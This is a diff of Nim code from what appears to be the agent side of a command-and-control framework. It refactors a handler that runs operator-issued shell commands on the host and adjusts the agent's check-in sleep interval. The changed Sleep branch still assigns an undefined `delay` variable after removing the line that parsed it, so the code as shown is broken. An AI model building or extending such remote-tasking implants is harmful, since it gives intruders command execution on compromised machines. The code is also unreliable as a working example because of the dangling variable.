@@ -1,49 +1,28 @@
-import base64, strutils
+import strutils
 import ./types 
 import ./commands/commands
 
-proc handleTask*(task: Task, config: AgentConfig): Task = 
+proc handleTask*(task: Task, config: AgentConfig): TaskResult = 
     
     # Handle task command
     case task.command: 
 
     of ExecuteShell: 
-        
-        let (output, status) = taskShell(task.args)
-        echo output
+        let taskResult = taskShell(task)
+        echo taskResult.data
+        return taskResult
 
-        return Task(
-            id: task.id, 
-            agent: task.agent,
-            command: task.command,
-            args: task.args,
-            result: encode(output), # Base64 encode result
-            status: status
-        )
-
-    of Sleep: 
-        # Parse arguments
-        let delay: int = parseInt(task.args[0])
-        
+    of Sleep:         
         # Execute task
-        let (output, status) = taskSleep(delay)
+        let taskResult = taskSleep(task)
         
         # Update sleep delay in agent config
-        if status == Completed: 
+        if taskResult.status == Completed: 
             config.sleep = delay
 
         # Return result
-        return Task(
-            id: task.id, 
-            agent: task.agent,
-            command: task.command,
-            args: task.args,
-            result: encode(output),
-            status: status
-        )
+        return taskResult
 
     else: 
         echo "Not implemented"
         return nil 
-
-    return task
